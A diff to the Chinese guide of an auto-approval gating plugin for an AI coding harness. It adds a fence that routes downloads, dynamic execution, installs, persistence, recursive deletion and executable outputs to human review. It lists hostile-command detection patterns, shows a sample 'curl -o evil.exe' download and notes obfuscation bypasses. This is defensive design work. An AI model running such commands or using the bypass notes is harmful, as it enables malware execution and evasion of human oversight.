@@ -2,13 +2,14 @@
 
 > 首页：[简体中文](../README.md) · [English](../README.en.md) · 指南：[中文](GUIDE.md) · [English](GUIDE.en.md)
 
-DeepSeek Harness 自动审批门控插件 v0.9.6：**最小人工介入，只把必须人工确认的操作转人工（fail-safe）**。
+DeepSeek Harness 自动审批门控插件 v0.9.7：**最小人工介入，只把必须人工确认的操作转人工（fail-safe）**。
 
 当会话的权限预设为 `auto-approve`（自动审批（Flash））时，每次审批请求（沙箱越界）按管道判定：
 
 ```
 硬拒（凭据外泄 / 根与系统路径销毁）→ 硬事实人工（home 根 / 门的例外）
-  → DENY（不可逆危险词）→ DSH 配置自动放行（v0.9.5）→ 白名单（确定性规则）
+  → DENY（不可逆危险词）→ 危险动作围栏（v0.9.7：下载 / 动态执行 / 依赖安装 / 持久化 / 递归删除 / 可执行产物）
+  → DSH 配置自动放行（v0.9.5）→ 白名单（确定性规则）→ 定域放行（v0.9.7：目标全在区内）
   → denyRules（裁决拒绝升级）→ 脱敏 → 判定（JSON allow/ask/deny，硬类别 / 中立确认 / 失败计数）→ 学习沉淀
 ```
 
@@ -21,7 +22,9 @@ DeepSeek Harness 自动审批门控插件 v0.9.6：**最小人工介入，只把
   - 常规工作区操作不受影响，绝不被硬拒
   - **⚠️ 人工档排在白名单与学习之前**：命中人工档即 `return`，因此这类操作**不计数、不学习、白名单规则盖不过、也没有追认按钮**。审批记录里只显示「人工通过」，**不会**出现「学习 N/3」——批准再多次也不会自动放行。这是有意语义（home 根、审批门自身数据、凭据文件不由自动审批改写，也不因此被学习成放行规则），不是学习失效。典型现场：反复修改 profile 的 `cordis.patch.yml`（2026-10-02 排查确认）——**该现场已于 v0.9.5 改为自动放行**，因为用户明确认定 DSH 配置改动风险可控
 - **① DENY 层**：`rm -rf` / `drop table` / `force push` / 格式化等不可逆危险词命中 → 转人工（fail-safe）
+- **①b 危险动作围栏**（v0.9.7，**确定性，命中即转人工且不学习、不可追认**）：详见下文「危险动作围栏」小节。它排在**白名单与学习之前**，因此已沉淀的 `contains` 宽规则盖不过它 —— 否则一次追认就能把「下载」永久放行
 - **② 白名单层**：命中规则 → 直接放行（确定性，不过 LLM）。默认规则 `{mode:"workspace-write"}` —— 工作区写入（可回补）自动放行；也支持 `tool/mode/category/contains` 组合规则（含学习沉淀的规则）
+- **②b 定域放行**（v0.9.7，可在设置页关闭）：`targetScope === 'inside'` 且未命中围栏 → 直接放行，事件记 `verdict: scope`，**判定器零调用**。`unknown` / `outside` / `mixed` 一律不放行（fail-closed）。它排在白名单**之后**，因此已有规则的归因与行为完全不变，本层只**新增**放行
 - **③ denyRules 层**：此前用户**裁决拒绝**过的「工具+模式+类别」→ 永久转人工（不会自动放行用户明确拒绝过的操作）
 - **④ 脱敏**（吸收自 dsh-auto-mode）：送判定模型前先抹除密钥、截断大块正文（见下文「判定输入脱敏」）
 - **⑤ 判定**（仅越界请求）：输出**严格 JSON** `{decision, reason, category}`
@@ -212,11 +215,11 @@ DSH 设置面板新增「自动审批」分区（settings.section，样式与 DS
    - **diff 快照管理**：视图顶部显示「diff 快照 占用 · 条数」，并提供两个清理入口——**「仅清本会话」**（只删除当前会话的快照，不影响其他会话未查看的 diff）与**「清空全部」**（二次确认后清空所有会话；均仅删除对比数据，不影响审批记录本身，删除后历史文件不可再查看对比）
    - 限制：仅文本文件（单文件 ≤256KB、每事件 ≤5 个文件）会保存快照，二进制/超限文件不可点击
 
-数据链路：host 每次判定追加结构化事件到 `~/.dsh/auto-approve/events.jsonl`（`kind`: auto / manual-pending / manual-approved / manual-rejected / hard-reject / judge-deny / reconsidered，含 sessionId/tool/mode/reason/justification/verdict/files/learningCount/threshold，v0.8.1 起的中文说明 `zh`，v0.9.0 起的结构化事实 `facts`，以及 v0.9.6 起的目标定域 `targets` / `targetScope` / `targetTraversal`），浏览器通过 `GET /api/auto-approve/events?sessionId=&since=` 轮询（2s 增量 / 视图 5s 全量）。
+数据链路：host 每次判定追加结构化事件到 `~/.dsh/auto-approve/events.jsonl`（`kind`: auto / manual-pending / manual-approved / manual-rejected / hard-reject / judge-deny / reconsidered，含 sessionId/tool/mode/reason/justification/verdict/files/learningCount/threshold，v0.8.1 起的中文说明 `zh`，v0.9.0 起的结构化事实 `facts`，以及 v0.9.6 起的目标定域 `targets` / `targetScope` / `targetTraversal`，v0.9.7 起的围栏拦截原因 `facts.fenceText` 与定域放行 `verdict: scope`），浏览器通过 `GET /api/auto-approve/events?sessionId=&since=` 轮询（2s 增量 / 视图 5s 全量）。
 
 > `zh` 是**面向审批人的中文说明**（v0.8.1+，v0.9.0 起按字段分行）：`src/zh.mjs` 用真实事实（目标模式 / 真实命令 / 真实目标路径）生成，形如「操作：删除 / 路径：C:\temp\a.txt / 影响：整机（工作区外任意路径可读写，含系统位置；改动不可自动回滚）/ 命令：Remove-Item C:\temp\a.txt / 原因：<模型原文>」；命令与路径原样保留，模型原文放在「原因」行。原文已是中文且无提权事实时不改写（返回 null）。前端优先渲染 `zh`，缺 `zh`（老事件）回退 `justification`；`justification` 永远保存原文。
 
-> `facts` 是**结构化审批事实**（v0.9.0+，v0.9.6 起含目标定域）：字段为 `tool` / `action`（操作类型：删除、推送/发布、新增/写入、修改、执行命令、读取、检索、调用）/ `actionKey`（供前端配色）/ `mode` / `scopeShort`（整机、工作区、只读、未提权）/ `scopeDetail`（后果一句话）/ `paths[]`（最多 8 条，绝对路径目标在前、写目标在后）/ `pathsMissing` / **`targetScope`**（`inside` / `outside` / `mixed` / `unknown`）/ **`targetScopeText`**（中文一句话）/ **`targetTraversal`**（命令里有 `..` 穿越）/ `command` / `commandLabel` / `reason`。落盘前经 `compactFacts()` 白名单过滤与逐项截断，避免 `events.jsonl` 无界膨胀；**盘上缺 `facts` 的老事件由事件 API 在响应里按已记录的事实（tool / mode / files / command / justification）现算补上，不回写文件**——事件日志保留当初写下的事实。浏览器端**审批记录行优先渲染 `facts` 字段表格**（操作类型 / 操作路径 / **目标位置** / 影响范围 / 执行命令 / 模型说明，另附非 neutral 的风险类别），`facts` 缺失的老事件回退渲染 `zh` / `justification` 文本。注意：宿主审批卡（`dsh-client-ui-approval`）把 `reason` 当纯文本渲染、不解析 Markdown/HTML 且不保留换行，因此卡片上只能显示字段分行的纯文本，**表格只存在于本插件的「审批」视图**；不注入依赖宿主内部 DOM 的 CSS，以免 DSH 升级后样式失效。
+> `facts` 是**结构化审批事实**（v0.9.0+，v0.9.6 起含目标定域）：字段为 `tool` / `action`（操作类型：删除、推送/发布、新增/写入、修改、执行命令、读取、检索、调用）/ `actionKey`（供前端配色）/ `mode` / `scopeShort`（整机、工作区、只读、未提权）/ `scopeDetail`（后果一句话）/ `paths[]`（最多 8 条，绝对路径目标在前、写目标在后）/ `pathsMissing` / **`targetScope`**（`inside` / `outside` / `mixed` / `unknown`）/ **`targetScopeText`**（中文一句话）/ **`targetTraversal`**（命令里有 `..` 穿越）/ **`fenceText`**（v0.9.7：围栏拦截原因，命中时才有）/ `command` / `commandLabel` / `reason`。落盘前经 `compactFacts()` 白名单过滤与逐项截断，避免 `events.jsonl` 无界膨胀；**盘上缺 `facts` 的老事件由事件 API 在响应里按已记录的事实（tool / mode / files / command / justification）现算补上，不回写文件**——事件日志保留当初写下的事实。浏览器端**审批记录行优先渲染 `facts` 字段表格**（操作类型 / 操作路径 / **目标位置** / 影响范围 / 执行命令 / 模型说明，命中围栏时另加「**拦截原因**」行；另附非 neutral 的风险类别），`facts` 缺失的老事件回退渲染 `zh` / `justification` 文本。注意：宿主审批卡（`dsh-client-ui-approval`）把 `reason` 当纯文本渲染、不解析 Markdown/HTML 且不保留换行，因此卡片上只能显示字段分行的纯文本，**表格只存在于本插件的「审批」视图**；不注入依赖宿主内部 DOM 的 CSS，以免 DSH 升级后样式失效。
 
 > **目标定域**（v0.9.6+）：事件新增 `targets`（绝对路径，最多 12 条）与 `targetScope`。它与 `facts.scopeShort`（沙箱模式的影响范围）是**两个不同的轴**：`targetScope` 回答「这次碰的是哪些位置」，字段表格里单独占「目标位置」一行，非 `inside` 时用警示色。语义刻意保守（fail-closed）：
 >
@@ -229,6 +232,29 @@ DSH 设置面板新增「自动审批」分区（settings.section，样式与 DS
 > | 命令里有 `..\` / `../` 穿越且字面量全在工作区内 | 降级为 `unknown` |
 >
 > `unknown` **必须**与 `outside` 同等对待，不得读成「工作区内」。只提取**绝对路径字面量**：`origin/main`、`refs/heads/x`、`src/a.ts`、`IamNewHands/repo`、URL 路径段一律不产出目标；引号内的整段优先（`'C:\Program Files\Git\bin\bash.exe'` 不会被截成 `C:\Program`）；`/d/GitHub_Clone/x`（Git-Bash 写法）折算到 `D:` 后比较；系统程序位置（`/usr/bin/env`、`C:\Windows\System32\…`、`C:\Program Files\…`）与设备伪文件（`/dev/null`）不算 `data` 目标。**`files` 语义不变**：仍只装写目标（供改动前快照），只读目标只进 `targets` —— 否则 `Get-Content ~/.ssh/id_rsa` 会把私钥内容复制进审批门自己的快照目录。判定模型的 `filesystemEffects` 用「命令绝对路径 ∪ 写目标」，因此命令类工具不再以「不涉及任何文件」的形态送判。**本版不改动确定性裁决逻辑**（硬拒 / 危险词 / 白名单 / 学习一行未动）：`unknown` / `outside` 目前只落审计，不影响放行与转人工；但判定模型的输入变了，判定层对命令类调用的裁决可能与以前不同。已知误报：命令里内嵌脚本/配置正文时可能产出 POSIX 根形态的假目标（如 heredoc 里的 `/build-app.yml`），只会让定域偏保守。
+
+> **危险动作围栏 + 定域放行**（v0.9.7+，用户 2026-10-04 决策）：工作区内的增删改查风险可控、不必每次人工；但模型被诱导下载恶意脚本 / exe 时必须触发审批。这两条天然矛盾 —— `curl -o evil.exe http://x/y` 的目标**完全在工作区内**，纯定域规则会直接放行。因此围栏是定域放行之上的**否决层**，且排在白名单与学习**之前**。
+>
+> | 类别 | 命中特征 | 豁免 |
+> |---|---|---|
+> | 网络下载 | `curl` / `wget` / `aria2c` / `bitsadmin` / `Invoke-WebRequest`\|`iwr` / `Invoke-RestMethod`\|`irm` / `Start-BitsTransfer` / `certutil -urlcache` / `DownloadString`\|`DownloadFile`\|`DownloadData` / `gh release download` | 命令里的 URL **全部**指向本机（`http://127.0.0.1:1933/health` 是健康检查，不是取物） |
+> | 动态执行 | `Invoke-Expression` / `iex` / `-EncodedCommand` / `FromBase64String` / `certutil -decode` / `\| bash`\|`sh`\|`pwsh`\|`powershell`\|`cmd`\|`iex` | — |
+> | 依赖安装 | `npm`\|`pnpm`\|`yarn`\|`bun` `i`\|`install`\|`add`\|`dlx`\|`exec` / `pip install` / `cargo`\|`go`\|`winget`\|`choco`\|`scoop install` / `docker pull` | 命令指向 `$DSH_HOME`（profile / 插件依赖那一档本就自动放行） |
+> | 持久化 | `schtasks` / `reg add` / `New-Service` / `sc create` / `core.hooksPath` / `Set-ExecutionPolicy` / `netsh advfirewall` / `Add-MpPreference` / `bcdedit` / `wmic` / `takeown` / `icacls` | — |
+> | 递归删除 | `Remove-Item … -Recurse` / `rm -r…` / `rmdir /s` / `rmtree` / `git clean` / `git reset --hard` | **单文件清理不拦**：推送后删掉 `_commit-msg.txt` 是日常动作（30 天 36 次），全拦会把人工提示从 147 抬到 180 |
+> | 可执行产物 | 写目标扩展名 `.exe .dll .msi .bat .cmd .ps1 .vbs .hta .lnk .reg .jar …`，或落在 `.git/hooks/`、`.github/workflows/`、`Startup/`、`sitecustomize.py` | `.sh`/`.py`/`.js` 不在列（开发工作区天天产出）；「下载 `.sh` 再执行」由前两行覆盖 |
+>
+> 判定口径刻意收窄（每条都对应实测到的假命中）：**命令类工具只看命令里的「落盘目标」**（重定向 / `-OutFile` / `-o` / `--output` / `-DestinationPath` / `Out-File` / `Set-Content` / `open(...,'w')`），不看它被 `resolveToolCallFiles` 判定的「写目标」—— 后者的写特征很宽（`*>` 重定向就算写），会把 `pwsh -File .\build.ps1 *> .\tmp\x.log` 里**被执行**的 `.ps1` 误判成「本次产出的可执行文件」；**持久化按动词判定**，`.github/workflows` 出现在读取命令或 `git add` 参数里不是持久化；`Start-Process` 不在围栏里（启动本地服务是常规动作）。
+>
+> 命中即转人工，且**不学习、不可追认**（`forwardToHuman` 只在 `why='flash-failed'` 时沉淀规则）。拦截原因进事件（`facts.fenceText`）与中文卡正文（新增 `拦截：…` 行），字段表格新增「拦截原因」行（警示色）。
+>
+> 定域放行的定域输入包含**解析后的相对写目标**：`write` / `edit` 常给 `src/x.mjs`，不解析就永远是 `unknown`（= 不放行），这条最常见的写操作本来会完全失效。设置页开关「定域放行：目标全部在工作区内 → 直接放行」可一键回到旧行为。
+>
+> 实测（真实 `events.jsonl`，30 天 1204 事件 / 147 次人工提示）：围栏命中 **23 次**（其中 13 次原本自动放行 ⇒ 约 +0.4 次人工/天），定域放行省下 **23 次**人工提示，**净少 10 次（−7%）**。人工提示分布 `unknown` 83 / `outside` 35 / `inside` 27 / `mixed` 2 —— 区内只占 18%，所以定域放行的上限本来就不高。围栏贡献最大的一项是**递归删除（15 次）**，其中 4 次是 heredoc 脚本正文含 `rm -rf` 的假命中。
+>
+> **诚实交代**：围栏是**文本特征**匹配，能被刻意混淆绕过（base64、变量拼接、二次下载、先写脚本再执行）。它挡的是「模型被诱导」这类非对抗性失败，不是定向攻击；真正的边界仍然是沙箱与人工。
+>
+> **行为变化**：判定器看到的流量变窄 —— 工作区内的调用不再进入判定层（原先「区内调用 → 判定器 → allow」的路径改由确定性规则接管）。
 
 
 > 顶部「审批」tab 的条数（v0.9.0+）：宿主把 `conversation.view` 的 `label` 经 `resolveSlotLabel()` 的结果**当字符串**渲染 tab 文案，且只在「slot 变更 / locale 发布」时重算 tab 列表（`refreshViews` 同时订阅 `slots.subscribe` 与 `locale.subscribe`）。因此条数实现为 **label thunk 读模块级计数 + 条数真变化时发布一次 locale**（注册一次性 namespace 后立即撤销，避免「同一 namespace 不能重复 register」）。口径 = 本会话「审批」视图真正列出的行数（`manual-pending` 只活在提示条里，不计入），数字与打开 tab 后看到的行数一致。`locale` 服务不可用时退回静态「审批」，不影响审批本身。
